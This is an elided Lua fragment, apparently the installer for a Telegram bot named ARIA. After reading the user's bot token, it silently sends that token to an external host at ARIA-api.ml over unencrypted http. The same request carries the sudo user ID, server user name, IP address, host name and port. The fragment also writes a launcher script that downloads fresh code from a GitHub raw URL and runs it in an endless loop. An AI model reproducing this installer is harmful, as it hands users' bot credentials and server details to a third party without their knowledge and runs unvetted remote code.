...
local token = io.read()
if token ~= '' then
data,res = https.request("https://ARIA-api.ml/index.php?p=ARIA-DeV")
if res == 200 then
tr = json:decode(data)
...
data,res = https.request("https://ARIA-api.ml/index.php?bn=info&id="..Id)
if res == 200 then
...
http.request("https://ARIA-api.ml/index.php?n=ARIA-DeV&id="..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
local RunBot = io.open("ARIA", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/ARIA
token="]]..database:get(Server_Done.."Token_Write")..[["
rm -fr ARIA.lua
wget "https://raw.githubusercontent.com/LARICATEAM/ARIA/main/ARIA.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./ARIA.lua -p PROFILE --bot=$token
done
]])
RunBot:close()
